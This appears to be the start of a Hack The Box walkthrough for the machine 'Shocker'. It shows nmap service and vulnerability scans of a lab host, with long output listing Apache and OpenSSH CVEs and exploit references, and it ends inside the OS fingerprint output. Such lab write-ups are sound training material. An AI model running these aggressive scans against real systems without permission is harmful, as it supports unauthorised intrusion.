# Shocker Walkthrough

![Shocker](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Shocker/shocker.png)

## Let's First fast Scan our machine with nmap.

```
sudo nmap -F -sV 10.10.10.56
``` 

### Result

```
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) 
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

## Nmap fast scan gives on one port open let's berif scan machine

```
sudo nmap -A -O -v --script vuln 10.10.10.56
```

### Result

```
PORT     STATE SERVICE VERSION 
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_      http://ha.ckers.org/slowloris/ 
| vulners:  
|   cpe:/a:apache:http_server:2.4.18:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679 
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668 
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169 
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0211/     *EXPLOIT* 
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4
259C41D8BDA0AB  *EXPLOIT* 
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT* 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211 
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15715/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/       6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-8743/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D6
89921651A30355  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       EDB-ID:40909    5.0     https://vulners.com/exploitdb/EDB-ID:40909      *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189 
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743 
|       CVE-2016-8740   5.0     https://vulners.com/cve/CVE-2016-8740 
|       CVE-2016-4979   5.0     https://vulners.com/cve/CVE-2016-4979 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-0197/      *EXPLOIT* 
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11985/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2016-1546   4.3     https://vulners.com/cve/CVE-2016-1546 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612 
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT* 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.2p2:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT* 
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29
334297EC0B6A09  *EXPLOIT* 
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT* 
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858 
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515 
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT* 
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT* 
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009 
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT* 
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT* 
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012 
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325 
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT* 
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010 
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT* 
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT* 
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT* 
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BD
BD274FD222226F  *EXPLOIT* 
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A2
7A441281EAD138  *EXPLOIT* 
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396
911926B4C3B330  *EXPLOIT* 
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT* 
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT* 
|       EDB-ID:39569    5.5     https://vulners.com/exploitdb/EDB-ID:39569      *EXPLOIT* 
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115 
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT* 
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS
*EXPLOIT* 
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3
C649B764E13FB0  *EXPLOIT* 
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648
B4D14B75563283  *EXPLOIT* 
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT* 
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708 
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5
F09C7F2B27C6DF  *EXPLOIT* 
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19A
C0DC1CD97BA3EF  *EXPLOIT* 
|       EDB-ID:40136    4.3     https://vulners.com/exploitdb/EDB-ID:40136      *EXPLOIT* 
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210 
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT* 
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT* 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT* 
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT* 
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT* 
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/        0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_E
NUMUSERS/       *EXPLOIT* 
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT* 
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). 
TCP/IP fingerprint: 
OS:SCAN(V=7.92%E=4%D=4/2%OT=80%CT=1%CU=31191%PV=Y%DS=2%DC=T%G=Y%TM=62483706 
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS( 
OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11 
